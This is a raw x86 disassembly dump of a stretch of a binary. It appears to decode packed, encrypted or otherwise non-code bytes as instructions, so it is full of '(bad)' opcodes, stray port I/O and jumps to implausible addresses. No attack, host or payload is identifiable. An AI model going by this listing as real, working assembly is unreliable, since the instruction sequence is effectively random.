  412395:	lds    ebx,FWORD PTR [ecx+ecx*2-0x48543f23]
  41239c:	aas    
  41239d:	pop    ebx
  41239e:	out    0x3,eax
  4123a0:	ds mov cl,0xbe
  4123a3:	mov    edx,0x56e75f7f
  4123a8:	mov    ch,0x3f
  4123aa:	imul   ecx,eax,0x79
  4123ad:	test   al,0x6a
  4123af:	das    
  4123b0:	dec    esi
  4123b1:	pop    ebx
  4123b2:	mov    ah,0xf9
  4123b4:	jmp    0x3e450b12
  4123b9:	mov    al,0x20
  4123bb:	ret    0x0
	...
  4123e6:	dec    ebp
  4123e7:	pop    ebx
  4123e8:	es aas 
  4123ea:	test   BYTE PTR cs:[ecx],bh
  4123ed:	jns    0x412469
  4123ef:	imul   ebx,DWORD PTR [esi],0xffffffe7
  4123f2:	mov    ebp,0xb703a8e0
  4123f7:	xchg   ebp,eax
  4123f8:	neg    DWORD PTR [ecx]
  4123fa:	ds push eax
  4123fc:	jne    0x4123b1
  4123fe:	(bad)
  412402:	call   0xf7cd:0xbcaceeb4
  412409:	add    edx,DWORD PTR [ebx+0x5f]
  41240c:	push   ecx
  41240d:	add    esp,DWORD PTR [edi+esi*4-0x2a]
  412411:	ss ss inc ebx
  412414:	jae    0x41245f
  412416:	ror    DWORD PTR [edi-0x39],0x36
  41241a:	push   edx
  41241b:	push   eax
  41241c:	xor    eax,0x154c99fc
  412421:	lods   eax,DWORD PTR ds:[esi]
  412422:	test   al,0xe1
  412424:	and    al,0xb0
  412426:	mov    al,ds:0x12acfbc5
  41242b:	arpl   WORD PTR [edi-0x68b00d8c],cx
  412431:	lods   al,BYTE PTR ds:[esi]
  412432:	adc    ah,BYTE PTR [edi-0x72]
  412435:	ss ss inc ebx
  412438:	push   esp
  412439:	dec    esi
  41243a:	jns    0x41248b
  41243c:	jno    0x412484
  41243e:	jbe    0x41248f
  412440:	add    esp,edi
  412442:	push   ecx
  412443:	push   eax
  412444:	je     0x412427
  412446:	(bad)
  412449:	data16 add BYTE PTR [eax],al
	...
  412474:	stos   BYTE PTR es:[edi],al
  412475:	push   eax
  412476:	je     0x41246d
  412478:	mov    ds:0x7d4108c6,al
  41247d:	scas   al,BYTE PTR es:[edi]
  41247e:	std    
  41247f:	dec    esi
  412480:	(bad)  
  412481:	xchg   esi,eax
  412482:	adc    al,0x6a
  412484:	and    eax,0xbeed724f
  412489:	iret   
  41248a:	cld    
  41248b:	in     al,0x71
  41248d:	pusha  
  41248e:	sub    DWORD PTR [ecx+edx*8-0x9118ba9],0xff305e0e
  412499:	push   0x0
  41249b:	dec    eax
  41249c:	shl    eax,0x3f
  41249f:	jmp    0xac795b90
  4124a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124a5:	enter  0xd205,0xfd
  4124a9:	lods   eax,DWORD PTR ds:[esi]
  4124aa:	(bad)  
  4124ab:	sub    edx,DWORD PTR [ecx+0x5b]
  4124ae:	sub    DWORD PTR [ecx+edx*4+0x57],0xc7a4f773
  4124b6:	adc    al,0xde
  4124b8:	packsswb mm5,mm0
  4124bb:	add    DWORD PTR [edi+0x4e],esi
  4124be:	(bad)  
  4124bf:	pusha  
  4124c0:	jg     0x4124e5
  4124c2:	imul   ebp,ecx,0xd1005c3d
  4124c8:	mov    esp,0x2bb6fdbc
  4124cd:	xchg   edi,eax
  4124ce:	hlt    
  4124cf:	add    dl,ch
  4124d1:	inc    ecx
  4124d2:	adc    esp,DWORD PTR [esi+0x14fd674f]
	...
  412500:	add    BYTE PTR [eax],al
  412502:	xchg   edx,eax
  412503:	ss xor al,0x34
  412506:	aad    0x4d
  412508:	mov    dh,BYTE PTR [esi+ecx*8]
  41250b:	jecxz  0x412511
  41250d:	add    ch,bh
  41250f:	cdq    
  412510:	cmp    DWORD PTR [ebp-0x41],edi
  412513:	test   edi,esp
  412515:	mov    ebx,DWORD PTR [edx]
  412517:	imul   eax,DWORD PTR [ecx+0xd8b5738],0xffffffff
  41251e:	jp     0x41251e
  412520:	in     eax,0x41
  412522:	test   DWORD PTR [ecx],eax
  412524:	jmp    FWORD PTR [ebx]
  412526:	pop    ss
  412527:	mov    ds:0x5a4bc2c7,al
  41252c:	cmp    DWORD PTR [ebp-0x7d],0xb8850d5c
  412533:	push   esi
  412534:	add    BYTE PTR [eax],al
  412536:	cmp    al,0x2
  412538:	jmp    0x4125a8
  41253a:	pushf  
  41253b:	lods   al,BYTE PTR ds:[esi]
  41253c:	hlt    
  41253d:	mov    ebp,DWORD PTR [ebx]
  41253f:	rol    BYTE PTR [edx],0x45
  412542:	aaa    
  412543:	ins    DWORD PTR es:[edi],dx
  412544:	add    BYTE PTR [eax+0x30],dl
  412547:	mov    WORD PTR [eax],cs
  412549:	call   0x3ec5ba
  41254e:	inc    eax
  41254f:	mov    WORD PTR [edi+edi*8],ss
  412552:	push   0x52
  412554:	out    0xb9,al
  412556:	rol    DWORD PTR [eax],cl
  412558:	dec    DWORD PTR [ecx+0x68059a]
  41255e:	loopne 0x4124ea
  412560:	adc    al,0xff
  412562:	push   0x4f
  412564:	out    0x49,al
	...
  41258e:	add    BYTE PTR [eax],al
  412590:	out    dx,eax
  412591:	add    bh,bh
  412593:	mov    esp,DWORD PTR [edx]
  412595:	imul   eax,DWORD PTR [ecx+0xd8aa739],0xffffffff
  41259c:	push   0xb
  41259e:	out    0xed,al
  4125a0:	test   BYTE PTR [ecx],0xff
  4125a3:	sub    edx,edi
  4125a5:	mov    al,ds:0x599bc2c7
  4125aa:	std    
  4125ab:	jne    0x4125ec
  4125ad:	add    dh,BYTE PTR [ebp+0x14]
  4125b0:	ds in  eax,0x30
  4125b3:	int3   
  4125b4:	and    DWORD PTR [esi-0x8],0x9a4bf3fe
  4125bb:	xchg   edx,eax
  4125bc:	jo     0x41258a
  4125be:	stos   BYTE PTR es:[edi],al
  4125bf:	or     bh,BYTE PTR [esi+0x4e]
  4125c2:	sti    
  4125c3:	(bad)  
  4125c4:	jmp    0x41258d
  4125c6:	cdq    
  4125c7:	(bad)
  4125ca:	stos   BYTE PTR es:[edi],al
  4125cb:	sub    bh,BYTE PTR [esi+0xc]
  4125ce:	mov    ebp,0x434432c1
  4125d3:	cmp    eax,ebx
  4125d5:	stos   DWORD PTR es:[edi],eax
  4125d6:	xor    ecx,DWORD PTR [ebp-0xf5efc7]
  4125dc:	stos   DWORD PTR es:[edi],eax
  4125dd:	es stos DWORD PTR es:[edi],eax
  4125df:	je     0x4125d7
  4125e1:	test   DWORD PTR [eax],esi
  4125e3:	or     al,0x21
  4125e5:	or     dl,bh
  4125e7:	out    0xa0,eax
  4125e9:	je     0x412595
  4125eb:	inc    BYTE PTR [ebp-0x7e]
  4125ee:	cli    
  4125ef:	test   BYTE PTR [ebx+eax*2+0x2],ch
	...
  41261b:	add    BYTE PTR [eax],al
  41261d:	add    BYTE PTR [ecx],al
  41261f:	call   0xe4150dd1
  412624:	stos   BYTE PTR es:[edi],al
  412625:	(bad)  
  412626:	and    eax,0xfcc94a82
  41262b:	cs add ch,cl
  41262e:	and    BYTE PTR [ebx+0x2],al
  412631:	add    BYTE PTR [ebp+0x410ca8b7],bh
  412637:	mov    bh,0xf0
  412639:	add    BYTE PTR [esi],bh
  41263b:	inc    edx
  41263c:	(bad)  
  41263e:	xlat   BYTE PTR ds:[ebx]
  41263f:	push   esi
  412640:	add    DWORD PTR [eax],eax
  412642:	ds leave 
  412644:	dec    ebp
  412645:	hlt    
  412646:	lds    esi,FWORD PTR [esi]
  412648:	ins    BYTE PTR es:[edi],dx
  412649:	add    al,BYTE PTR [ebx]
  41264b:	adc    bl,BYTE PTR [edi]
  41264d:	add    BYTE PTR [esi],cl
  41264f:	std    
  412650:	sub    eax,0xee5ba608
  412655:	dec    edx
  412656:	xchg   ecx,eax
  412657:	dec    esp
  412658:	adc    al,BYTE PTR [ecx+ecx*4]
  41265b:	(bad)  
  41265c:	sti    
  41265d:	test   al,0xa
  41265f:	arpl   WORD PTR [edi+0x65],di
  412662:	jo     0x4126b0
  412664:	xchg   DWORD PTR [ebp+0x2],edi
  412667:	addr16 push 0xffffffeb
  41266a:	imul   eax,edi,0x46eaa8e6
  412670:	add    BYTE PTR [ecx-0x21],0x4b
  412674:	fst    QWORD PTR [bx+di+0x30ac]
  412679:	(bad)  
  41267a:	sub    eax,0xcdd5e25b
  41267f:	push   ebp
  412680:	inc    eax
  412681:	cwde   
	...
  4126aa:	add    BYTE PTR [eax],al
  4126ac:	cmp    DWORD PTR [eax+ebp*8+0x7a],ecx
  4126b0:	jp     0x4126f1
  4126b2:	rol    BYTE PTR [ebx],cl
  4126b4:	sub    esi,eax
  4126b6:	fld    TBYTE PTR [eax+0x353f63aa]
  4126bc:	adc    DWORD PTR [edi+eiz*1+0x7d],ecx
  4126c0:	and    BYTE PTR [edi+0x6a],0xeb
  4126c4:	or     edi,eax
  4126c6:	out    0xa8,al
  4126c8:	mov    al,BYTE PTR [edi+0x0]
  4126cb:	adc    DWORD PTR [edi+0x4c],ebx
  4126ce:	pop    es
  4126cf:	fnsave [ecx+0x4dc630ab]
  4126d5:	pop    ebx
  4126d6:	imul   dh
  4126d8:	mov    ebp,0xc903a8dc
  4126dd:	xchg   ebp,eax
  4126de:	iret   
  4126df:	jl     0x41275b
  4126e1:	inc    ebx
  4126e2:	imul   ebx,DWORD PTR [ebx-0x137e5cb],0x14
  4126e9:	sub    DWORD PTR [ecx-0x17b44658],edx
  4126ef:	mov    al,0xae
  4126f1:	xlat   BYTE PTR ds:[ebx]
  4126f2:	iret   
  4126f3:	adc    BYTE PTR [edi-0x4536ff6b],dh
  4126f9:	mov    esi,0x971b0ae8
  4126fe:	in     al,dx
  4126ff:	loop   0x412751
  412701:	inc    ebx
  412702:	jbe    0x4126ef
  412704:	stos   BYTE PTR es:[edi],al
  412705:	sub    BYTE PTR [ecx],0xbb
  412708:	add    dl,BYTE PTR [edi+0x3b38c2ec]
  41270e:	mov    dh,BYTE PTR [eax+eax*1]
	...
  412739:	add    dl,dl
  41273b:	fdivr  DWORD PTR [edi+0x542c2ca]
  412741:	jle    0x4126ef
  412743:	pop    eax
  412744:	push   ebx
  412745:	mov    esp,edx
  412747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412748:	in     al,0x72
  41274a:	adc    BYTE PTR [ebx+0x3a],al
  41274d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41274e:	test   eax,0x6203c8
  412753:	cmp    ebp,edx
  412755:	jmp    0x6f60:0x46e49fba
  41275c:	std    
  41275d:	mov    ah,0xd1
  41275f:	call   0x36a0:0x4325bcfd
  412766:	out    0x49,al
  412768:	or     ch,BYTE PTR [ecx]
  41276a:	pusha  
  41276b:	pop    edx
  41276c:	std    
  41276d:	xchg   esp,eax
  41276e:	fld    DWORD PTR [edx-0x64]
  412771:	mov    esi,edx
  412773:	dec    ecx
  412774:	sub    ch,BYTE PTR [ecx]
  412776:	xchg   BYTE PTR [ebx+eax*8],dl
  412779:	fnstsw WORD PTR ds:0x6a1d43d4
  41277f:	sbb    cl,BYTE PTR [esp+ebp*4-0x5b74650f]
  412786:	add    eax,0xc4d1529b
  41278b:	inc    ebp
  41278c:	(bad)  
  41278d:	fimul  WORD PTR [ebx-0x61]
  412790:	rcl    dh,1
  412792:	(bad)  
  412794:	jmp    0xfe8b316f
  412799:	add    BYTE PTR [esp+esi*2],ah
  41279c:	rol    BYTE PTR [eax],1
	...
  4127c6:	add    BYTE PTR [eax],al
  4127c8:	jae    0x41281e
  4127ca:	cmp    DWORD PTR [ebp-0x31],0xe817745f
  4127d1:	mov    esp,ss
  4127d3:	push   DWORD PTR [edx]
  4127d5:	pop    ss
  4127d6:	push   DWORD PTR [ebp-0x65]
  4127d9:	add    DWORD PTR [ebp+0x8],esi
  4127dc:	test   al,0xac
  4127de:	sbb    bh,bh
  4127e0:	push   edx
  4127e1:	pop    ss
  4127e2:	out    0x2,al
  4127e4:	mov    esp,0x7c47ff02
  4127e9:	jae    0x4127e3
  4127eb:	pmullw mm5,QWORD PTR ds:0x1e8fffc
  4127f2:	jne    0x4127e8
  4127f4:	out    dx,eax
  4127f5:	popf   
  4127f6:	pusha  
  4127f7:	(bad)  
  4127f8:	call   0x574128b3
  4127fd:	pop    esi
  4127fe:	pop    ebp
  4127ff:	leave  
  412800:	imul   eax,DWORD PTR gs:[eax],0x55
  412804:	lods   al,BYTE PTR ds:[esi]
  412805:	jecxz  0x41285d
  412807:	push   edx
  412809:	inc    ebp
  41280a:	out    0xd2,al
  41280c:	stc    
  41280d:	add    bh,bh
  41280f:	push   0x3f7b7e
  412814:	pop    eax
  412815:	mov    WORD PTR [eax],cs
  412817:	call   0x41abaf
  41281c:	sbb    al,0x1e
  41281e:	jne    0x412825
  412820:	test   al,0x6
  412822:	ror    BYTE PTR [eax],0xe7
  412825:	pop    es
  412826:	(bad)  
  412827:	(bad)  
  412828:	call   0x12930b7
	...
  412855:	add    BYTE PTR [esi],ah
  412857:	jno    0x412856
  412859:	jmp    FWORD PTR [eax]
  41285b:	out    0x61,al
  41285d:	inc    ecx
  41285e:	out    0x0,eax
  412860:	jne    0x41286a
  412862:	adc    bh,ah
  412864:	jae    0x4128b1
  412866:	ds xor al,0x2
  412869:	or     edi,DWORD PTR [esi-0x52]
  41286c:	call   FWORD PTR [esi-0x79]
  41286f:	cmc    
  412870:	stc    
  412871:	jmp    DWORD PTR [ebp-0x5e473dbc]
  412877:	adc    BYTE PTR [edi-0x16367302],ah
  41287d:	push   es
  41287e:	or     edx,esp
  412880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412881:	je     0x4128b9
  412883:	in     al,dx
  412884:	jo     0x4128cf
  412886:	ds xor al,0xfb
  412889:	mov    edi,0xc9473ef3
  41288e:	jl     0x4128db
  412890:	add    ch,BYTE PTR [eax+0x45]
  412893:	pop    edi
  412894:	inc    ebx
  412895:	add    BYTE PTR [ecx+0x46],ah
  412898:	cli    
  412899:	out    0xff,eax
  41289b:	jl     0x4128a1
  41289d:	add    BYTE PTR [ebp+0x74],al
  4128a0:	xor    BYTE PTR [ecx],cl
  4128a2:	dec    ecx
  4128a3:	test   BYTE PTR cs:[esi+0x4073c03b],0x3e
  4128ab:	sbb    bl,ah
  4128ad:	fs jg  0x4128e2
  4128b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128b1:	je     0x4128e9
  4128b3:	stos   BYTE PTR es:[edi],al
  4128b4:	fimul  WORD PTR [edx+0x3e]
  4128b7:	xor    bh,bl
  4128b9:	mov    edi,0x0
	...
  4128e2:	add    BYTE PTR [eax],al
  4128e4:	xchg   ebx,eax
  4128e5:	cmp    esp,DWORD PTR [edi+0xd14274]
  4128eb:	nop
  4128ec:	mov    eax,0x4b6801f3
  4128f1:	xlat   BYTE PTR ds:[ebx]
  4128f2:	inc    esp
  4128f3:	add    cl,bh
  4128f5:	out    dx,eax
  4128f6:	stc    
  4128f7:	out    0x43,eax
  4128f9:	or     eax,0x72350002
  4128fe:	xor    BYTE PTR [ecx],cl
  412900:	loope  0x4128c9
  412902:	cmc    
  412903:	mov    es,WORD PTR [ebx-0x52]
  412906:	jae    0x412948
  412908:	ds pop ebx
  41290a:	lahf   
  41290b:	add    edi,DWORD PTR [esi]
  41290d:	pop    ebx
  41290e:	out    0x44,eax
  412910:	neg    DWORD PTR ds:0xd41303e0
  412916:	mov    ebx,0x1e4f7d81
  41291b:	dec    ebp
  41291c:	push   ss
  41291d:	ds inc esp
  41291f:	inc    ebx
  412920:	ds dec eax
  412922:	cmp    eax,0x2326a1fc
  412927:	add    al,0x3e
  412929:	push   esp
  41292a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41292b:	das    
  41292c:	inc    eax
  41292d:	test   al,0x3d
  41292f:	mov    ebx,0x43e75f7f
  412934:	lds    ecx,FWORD PTR [ebx+0x63]
  412937:	daa    
  412938:	inc    esi
  412939:	xor    al,0xe9
  41293b:	pop    edi
  41293c:	jmp    0x647010c9
  412941:	(bad)  
  412942:	call   FWORD PTR [ebp+ebx*8+0xa4e799]
	...
  412971:	add    dl,cl
  412973:	push   edx
  412974:	dec    edi
  412975:	ins    DWORD PTR es:[edi],dx
  412976:	hlt    
  412977:	pop    edx
  412978:	out    0xf8,eax
  41297a:	or     esi,0x129844ed
  412980:	sub    al,BYTE PTR [eax]
  412982:	ds aam 0xc4
  412985:	sti    
  412986:	adc    al,0x7d
  412988:	addr16 in eax,0x36
  41298b:	iret   
  41298c:	rol    BYTE PTR [ebx+0xfb35658],1
  412992:	mov    esi,0x392ff187
  412997:	fcmovnu st,st(6)
  412999:	dec    eax
  41299a:	mov    dl,BYTE PTR [ebp+0x67]
  41299d:	in     eax,0x9a
  41299f:	iret   
  4129a0:	in     al,0x83
  4129a2:	xor    BYTE PTR [ebx+0x6000007c],bh
  4129a8:	(bad)  
  4129a9:	cmp    al,0xbe
  4129ab:	xchg   DWORD PTR [eax],eax
  4129ad:	jmp    0xa5074bda
  4129b2:	cdq    
  4129b3:	inc    edi
  4129b4:	(bad)  
  4129b5:	jmp    0xe18549f7
  4129ba:	cmp    eax,0x36e9005b
  4129bf:	(bad)  
  4129c0:	or     dl,al
  4129c2:	jbe    0x41299f
  4129c4:	cmp    eax,0x8174590e
  4129c9:	cmp    al,0xd6
  4129cb:	inc    edi
  4129cc:	jne    0x4129a9
  4129ce:	jmp    0x5b:0x3de8f89e
  4129d5:	sbb    al,0x0
	...
  4129ff:	add    BYTE PTR [esi],dh
  412a01:	and    BYTE PTR [ebp+ebx*4+0x3c],al
  412a05:	pop    ebx
  412a06:	add    cl,ch
  412a08:	(bad)  
  412a09:	ins    BYTE PTR es:[edi],dx
  412a0a:	cmc    
  412a0b:	and    al,0xa2
  412a0d:	pop    edx
  412a0e:	add    cl,ch
  412a10:	cmp    eax,0x62a70ace
  412a15:	lds    ebp,FWORD PTR [si]
  412a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a19:	inc    edi
  412a1a:	(bad)  
  412a1b:	jmp    0xc57f055d
  412a20:	sbb    BYTE PTR [esi-0x3],bl
  412a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a24:	xchg   ebp,eax
  412a25:	xor    al,0x6
  412a27:	cs js  0x412a6d
  412a2a:	add    ecx,ebp
  412a2c:	cmp    eax,0xe1c4815b
  412a31:	pop    ebx
  412a32:	jae    0x412a1e
  412a34:	jecxz  0x412a93
  412a36:	and    BYTE PTR [esi-0x4bff7a43],ch
  412a3c:	(bad)  
  412a3d:	sar    DWORD PTR [ebx-0xf],1
  412a40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a41:	bound  eax,QWORD PTR [eax+0x16d01dde]
  412a47:	imul   esp,DWORD PTR [edx],0x4d94205c
  412a4d:	scas   al,BYTE PTR es:[edi]
  412a4e:	jmp    0x47060353
  412a53:	add    DWORD PTR [edi+0x47],ebp
  412a56:	inc    edi
  412a57:	adc    BYTE PTR [eax-0x3f0a8ca6],0x8f
  412a5e:	inc    ebp
  412a5f:	and    BYTE PTR [eax],0x5f
  412a62:	jae    0x412a43
	...
  412a8c:	add    BYTE PTR [eax],al
  412a8e:	cwde   
  412a8f:	xchg   esp,eax
  412a90:	hlt    
  412a91:	add    BYTE PTR [edi+0xa8b005a],ah
  412a97:	push   edi
  412a98:	mov    DWORD PTR [ebp-0x51],edi
  412a9b:	cmc    
  412a9c:	pop    ds
  412a9d:	and    BYTE PTR [eax-0x16e38aca],0x52
  412aa4:	add    bh,bh
  412aa6:	dec    edx
  412aa7:	jecxz  0x412afc
  412aa9:	call   0x40271a
  412aae:	mov    WORD PTR [edx],ds
  412ab0:	jne    0x412ab8
  412ab2:	xor    BYTE PTR [ecx+0x5a5bc2c7],bl
  412ab8:	mov    edi,esi
  412aba:	sbb    edx,edi
  412abc:	inc    esp
  412abd:	hlt    
  412abe:	sbb    bh,bl
  412ac0:	add    BYTE PTR ds:[edx+0x7],bl
  412ac4:	push   DWORD PTR [ebp-0x35]
  412ac7:	sub    al,0xc
  412aca:	loope  0x412ac5
  412acc:	(bad)  
  412acd:	pop    edi
  412ace:	adc    DWORD PTR [edi],0x832704c0
  412ad4:	mov    esp,ebp
  412ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ad7:	adc    eax,esi
  412ad9:	push   esi
  412ada:	enter  0x7cdc,0x14
  412ade:	pop    ss
  412adf:	outs   dx,BYTE PTR ds:[esi]
  412ae0:	pop    es
  412ae1:	adc    DWORD PTR [edx],0xffffffdb
  412ae4:	dec    edx
  412ae5:	inc    ecx
  412ae6:	daa    
  412ae7:	pop    edx
  412ae8:	jae    0x412af0
  412aea:	add    BYTE PTR [edi+eax*8-0x76a5f83e],bl
  412af1:	inc    ebp
	...
  412b1a:	add    BYTE PTR [eax],al
  412b1c:	ds dec eax
  412b1e:	fld    QWORD PTR [edx+eax*8]
  412b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b22:	inc    ebx
  412b23:	add    BYTE PTR [ecx],bh
  412b25:	mov    cl,0x65
  412b27:	add    BYTE PTR [esi],bh
  412b29:	xor    al,0xdd
  412b2b:	add    al,0xae
  412b2d:	mov    ebp,0xb1410043
  412b32:	jns    0x412b34
  412b34:	ds xor al,0xdd
  412b37:	add    al,0xaa
  412b39:	mov    ch,0x44
  412b3b:	add    BYTE PTR [ecx-0x4f],cl
  412b3e:	mov    es,WORD PTR [eax]
  412b40:	ds xor al,0x91
  412b43:	inc    esp
  412b44:	mov    dl,0x63
  412b46:	pop    DWORD PTR [esi+eiz*4+0x63]
  412b4a:	pop    DWORD PTR [edx+ebx*4+0x63]
  412b4e:	mov    eax,ds:0x44a5c234
  412b53:	add    BYTE PTR [ecx-0x3f180b9a],cl
  412b59:	sti    
  412b5a:	mov    ds:0xac76cbfe,al
  412b5f:	dec    edi
  412b60:	ret    
  412b61:	jle    0x412b13
  412b63:	dec    edi
  412b64:	mov    ebx,0x614f9476
  412b69:	push   cs
  412b6a:	jbe    0x412af9
  412b6c:	push   DWORD PTR [ebx]
  412b6e:	mov    ds:0x65dc2e74,eax
  412b73:	test   DWORD PTR [ecx-0x44],0x3624490
  412b7a:	xchg   ecx,eax
  412b7b:	inc    esp
  412b7c:	push   ds
  412b7d:	add    edx,DWORD PTR [ecx+0x44]
	...
  412ba7:	add    BYTE PTR [eax],al
  412ba9:	add    BYTE PTR [edx],bl
  412bab:	add    esp,DWORD PTR [ebx+0x44ccce34]
  412bb1:	add    BYTE PTR [ecx],ah
  412bb3:	adc    dl,dh
  412bb5:	out    0xc4,eax
  412bb7:	mov    ah,BYTE PTR [edx-0x59efee02]
  412bbd:	mov    es,WORD PTR [ebx-0x755dc4a5]
  412bc3:	daa    
  412bc4:	outs   dx,DWORD PTR ds:[esi]
  412bc5:	dec    eax
  412bc6:	push   ss
  412bc7:	sbb    eax,0x44f1b3ad
  412bcc:	call   0x33dfe6d4
  412bd1:	xor    edx,DWORD PTR [edx+ebx*2-0x6f]
  412bd5:	add    esp,DWORD PTR [ebx+ebx*2-0x7f]
  412bd9:	add    esp,DWORD PTR [ebx+ebx*2+0x5c]
  412bdd:	dec    eax
  412bde:	repnz stos DWORD PTR es:[edi],eax
  412be0:	out    0xf7,al
  412be2:	mov    ds:0x45042890,al
  412be7:	sbb    esp,edi
  412be9:	xchg   DWORD PTR [edi+0x5a],eax
  412bec:	out    0x3,eax
  412bee:	mov    ebp,0x310497c6
  412bf3:	(bad)  
  412bf5:	add    bh,BYTE PTR [esi]
  412bf7:	pop    ebx
  412bf8:	bound  ecx,QWORD PTR [edi-0x7e]
  412bfb:	sbb    BYTE PTR [eax+ebp*4],0x38
  412bff:	fcomp  QWORD PTR [ebx-0x64a4c1fc]
  412c05:	(bad)  
  412c06:	repnz sub ah,BYTE PTR [ebx+0x1f]
  412c0a:	xchg   edx,eax
  412c0b:	rcr    BYTE PTR [eax+edx*8],1
	...
  412c36:	add    BYTE PTR [eax],al
  412c38:	pop    esp
  412c39:	pop    ecx
  412c3a:	jp     0x412ca4
  412c3c:	pusha  
  412c3d:	into   
  412c3e:	stos   DWORD PTR es:[edi],eax
  412c3f:	xchg   ecx,eax
  412c40:	add    bh,BYTE PTR [edi]
  412c42:	ja     0x412c5b
  412c44:	outs   dx,BYTE PTR ds:[esi]
  412c45:	xor    edi,DWORD PTR [eax+0x6a5b3e4b]
  412c4b:	pop    ds
  412c4c:	inc    edx
  412c4d:	pop    ebx
  412c4e:	out    dx,al
  412c4f:	xchg   DWORD PTR [ebx],ecx
  412c51:	pop    ebx
  412c52:	out    0x3,eax
  412c54:	mov    ebp,0x390457c5
  412c59:	fild   QWORD PTR [ebx]
  412c5b:	add    al,0x3e
  412c5d:	pop    ebx
  412c5e:	push   0x1f
  412c60:	and    bl,BYTE PTR [ebx+0x0]
  412c63:	out    0xb9,al
  412c65:	add    DWORD PTR [ecx],eax
  412c67:	jmp    0x25b570a9
  412c6c:	rol    BYTE PTR [edx-0x2d60e1a5],cl
  412c72:	inc    ebx
  412c73:	and    DWORD PTR [edi+0x510efcce],ebx
  412c79:	adc    edi,esi
  412c7b:	jl     0x412c46
  412c7d:	cmp    ebx,DWORD PTR [esi-0x64]
  412c80:	sahf   
  412c81:	inc    esp
  412c82:	imul   ebp,DWORD PTR [ebp+0x1009a18],0xe9009c89
  412c8c:	or     eax,0xfd4444b3
  412c91:	pop    edx
  412c92:	std    
  412c93:	pop    esp
  412c94:	cmp    BYTE PTR [ebx],0x84
  412c97:	and    BYTE PTR [edx+0x5b],al
  412c9a:	or     DWORD PTR [ecx+0x0],ebp
	...
  412cc4:	add    BYTE PTR [eax],al
  412cc6:	dec    ecx
  412cc7:	arpl   WORD PTR [eax+0x32],bp
  412cca:	popa   
  412ccb:	call   0xe900:0x9c7cc100
  412cd2:	dec    ebp
  412cd3:	mov    bl,0x49
  412cd5:	or     al,0xfd
  412cd7:	pop    edx
  412cd8:	std    
  412cd9:	adc    al,0x8a
  412cdb:	cmp    ebp,DWORD PTR [eax+0x20]
  412cde:	cmp    bl,BYTE PTR [ebx+0x9]
  412ce1:	test   eax,0x1a686351
  412ce6:	sbb    DWORD PTR [edx-0x631f6f00],ebx
  412cec:	add    cl,ch
  412cee:	or     eax,0xfd0451b3
  412cf3:	pop    edx
  412cf4:	std    
  412cf5:	fdiv   QWORD PTR [ebp+0x3b]
  412cf8:	dec    esp
  412cf9:	mov    al,0x3d
  412cfb:	pop    ebx
  412cfc:	or     DWORD PTR [ecx],ebp
  412cfe:	dec    eax
  412cff:	cwde   
  412d00:	push   0xbf323de9
  412d05:	add    BYTE PTR [eax+0x69],bh
  412d08:	or     al,0xe8
  412d0a:	push   es
  412d0b:	xchg   ch,bh
  412d0d:	dec    DWORD PTR [eax+0x29]
  412d10:	xchg   BYTE PTR [esi+0x75fd5ed6],cl
  412d16:	or     esi,edi
  412d18:	push   edx
  412d19:	pop    ecx
  412d1a:	pop    eax
  412d1b:	sti    
  412d1c:	(bad)  
  412d1d:	jne    0x412d6a
  412d1f:	sti    
  412d20:	je     0x412d16
  412d22:	cmp    BYTE PTR [ecx+0xc],ch
  412d25:	call   0x3eb2e6
	...
  412d52:	add    BYTE PTR [eax],al
  412d54:	fsubr  DWORD PTR [eax-0x10]
  412d57:	call   DWORD PTR [edx-0xa]
  412d5a:	(bad)  
  412d5b:	jne    0x412d48
  412d5d:	imul   BYTE PTR [ecx+ebx*2-0x28]
  412d61:	loop   0x412d61
  412d63:	jne    0x412ce8
  412d65:	loop   0x412ddb
  412d67:	fmul   QWORD PTR [eax+0x58e80c64]
  412d6d:	cmp    ch,0xff
  412d70:	js     0x412dd6
  412d72:	enter  0x57e8,0x9b
  412d76:	std    
  412d77:	jmp    FWORD PTR [eax]
  412d79:	add    edi,0x535e67c2
  412d7f:	mov    ebp,DWORD PTR [ebx-0x1b173e22]
  412d85:	jnp    0x412d9b
  412d87:	add    eax,0x112d358
  412d8c:	push   edi
  412d8d:	pop    esi
  412d8e:	mov    eax,DWORD PTR [ebp-0x1d]
  412d91:	xchg   BYTE PTR [ebx-0x747840bb],cl
  412d97:	inc    ebp
  412d98:	retf   
  412d99:	xchg   BYTE PTR [edx+0x2],ch
  412d9c:	fsub   DWORD PTR [ebx+0x10]
  412d9f:	call   0x4017da
  412da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412da5:	jl     0x412d9f
  412da7:	add    DWORD PTR [esi],edi
  412da9:	cmp    DWORD PTR [ecx+0x2343ef2],ecx
  412daf:	jmp    FWORD PTR [ebx+0xe448d80]
  412db5:	sub    al,0xf6
  412db7:	add    BYTE PTR fs:[eax],al
	...
  412de2:	jg     0x412e18
  412de4:	lahf   
  412de5:	je     0x412df5
  412de7:	pushf  
  412de8:	jge    0x412e30
  412dea:	ds xor al,0xb
  412ded:	ror    BYTE PTR [ecx-0x49],0xbc
  412df1:	push   ecx
  412df3:	xor    edx,DWORD PTR [ecx-0x6efc0dbc]
  412df9:	inc    esp
  412dfa:	out    0xe3,al
  412dfc:	nop
  412dfd:	inc    esp
  412dfe:	(bad)  
  412e00:	daa    
  412e01:	add    cl,dl
  412e03:	mov    esi,0x49e0e7f1
  412e08:	lahf   
  412e09:	(bad)  
  412e0a:	mov    ebp,0x49009cb6
  412e0f:	mov    bh,0x59
  412e11:	push   DWORD PTR [ecx-0x4d8b60cd]
  412e17:	fwait
  412e18:	mov    ebp,0xaa33ff63
  412e1d:	inc    ebp
  412e1e:	add    DWORD PTR [edx+eax*1],esi
  412e21:	or     edi,DWORD PTR [esi+0x38]
  412e24:	mov    DWORD PTR [edx-0x72fdcbc2],esp
  412e2a:	sti    
